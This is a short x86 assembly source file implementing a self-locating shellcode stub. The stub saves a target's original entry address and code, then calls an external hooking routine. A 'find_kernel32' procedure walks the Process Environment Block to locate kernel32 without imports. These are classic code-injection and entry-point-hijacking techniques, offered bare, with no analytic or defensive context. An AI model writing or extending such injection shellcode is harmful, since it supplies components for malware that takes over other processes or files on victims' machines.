.MODEL flat
.586P
EXTRN _HookCode@16:PROC
.CODE
public my_hook
my_hook PROC
	call start_shellcode
	old_entry_address dd 0h
	old_entry_code dd 0h
start_shellcode:
	pop ebx
	push esp
	pushad
	mov edx,esp
	mov eax,offset old_entry_code - offset start_shellcode
	lea eax,[ebx+eax]
	push eax
	mov eax,offset old_entry_address - offset start_shellcode
	lea eax,[ebx+eax]
	push eax
	call find_kernel32
	push eax
	push edx
	call _HookCode@16
	popad
	pop esp
	retn
my_hook ENDP

find_kernel32 PROC
	push ecx
	push edi
    push esi
    xor ecx, ecx
	assume fs:nothing
    mov ESI,dword ptr fs:30h
    mov esi, [esi + 00ch]
    mov esi, [esi + 1ch]
next_module:
    mov eax, [esi + 08h]
    mov edi,[esi+20h]
    mov esi ,[esi]
    cmp [edi+12*2],cx
    jne next_module
    pop esi
	pop edi
	pop ecx
    Ret
find_kernel32 ENDP
END
